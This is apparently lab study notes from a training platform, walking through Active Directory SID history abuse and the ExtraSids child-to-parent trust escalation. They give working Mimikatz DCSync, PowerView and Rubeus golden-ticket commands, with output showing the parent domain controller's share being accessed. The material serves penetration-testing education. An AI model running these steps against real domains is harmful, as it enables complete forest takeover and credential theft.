
## SID History Primer

The `sidHistory` attribute is used during migrations. When a user is migrated from one domain to another, a new account is created, and the original user's SID is added to the new user's `sidHistory`. This allows access to resources in the original domain even after migration.

### SID History Abuse

Attackers can perform SID history injection using tools like Mimikatz to add an administrator's SID to an account they control. When logging in, the account's token includes all SIDs in `sidHistory`, granting access to resources associated with those SIDs. If a Domain Admin SID is added, the attacker can perform **DCSync** or create **Golden Tickets** to impersonate any user in the domain.

---

## ExtraSids Attack with Mimikatz

This attack leverages the lack of SID filtering in trust relationships within the same AD forest. If a compromised child domain user has their `sidHistory` set to include the **Enterprise Admins** SID (which exists only in the parent domain), they are treated as a member of that group, granting full admin rights in the parent domain.

### Requirements:
- KRBTGT hash of the child domain
- SID of the child domain
- Target user name (can be fictitious)
- Child domain's FQDN
- SID of the parent domain's **Enterprise Admins** group

### Gathering Data

#### Obtain KRBTGT Hash

```powershell
PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

```

```plaintext
Hash NTLM: 9d765b482771505cbe97411065964d5f
```

#### Get Child Domain SID

```powershell
PS C:\htb> Get-DomainSID
```

Output:

```plaintext
plaintext

S-1-5-21-2806153819-209893948-922872689
```

#### Get Parent Domain's Enterprise Admin SID

```powershell
powershell

PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
```

Output:

```plaintext
plaintext

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  S-1-5-21-3842939050-3880317879-2865463114-519
```

## Attack Summary

- KRBTGT hash: `9d765b482771505cbe97411065964d5f`
- Child domain SID: `S-1-5-21-2806153819-209893948-922872689`
- Fake user name: `hacker`
- Child domain FQDN: `LOGISTICS.INLANEFREIGHT.LOCAL`
- Parent domain Enterprise Admin SID: `S-1-5-21-3842939050-3880317879-2865463114-519`

## Attack Execution

### Confirm No Access to Parent Domain DC

```powershell
powershell

PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
```

### Create Golden Ticket with Rubeus

```powershell
powershell

PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

This creates and injects a Golden Ticket, granting full access as `hacker@LOGISTICS.INLANEFREIGHT.LOCAL`.

### Confirm Ticket in Memory

```powershell
powershell

PS C:\htb> klist

Cached Tickets: (1)

#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
    Ticket Flags: forwardable, renewable, initial, pre-authent
    Start Time: 3/29/2022 10:06:41
    End Time:   3/29/2022 20:06:41
```

### Accessing the Domain Controller

```powershell
powershell

PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
Volume Serial Number is B8B3-0D72

Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
```

---

## Using Rubeus for ExtraSids

Before attempting access, verify access denial:

```powershell
powershell

PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
```

Formulate the Golden Ticket:

```powershell
powershell

PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

This grants full access to resources in the parent domain, effectively compromising the entire forest.

---

## Summary

- SID history can be exploited via injection to escalate privileges.
- Golden Tickets can be crafted using compromised domain data.
- Trust relationships, if misconfigured, can serve as attack vectors into higher-value domains.
- Always verify trust configurations and monitor for suspicious SID manipulations.

**Note:** Always ensure such activities are within scope and authorized during assessments.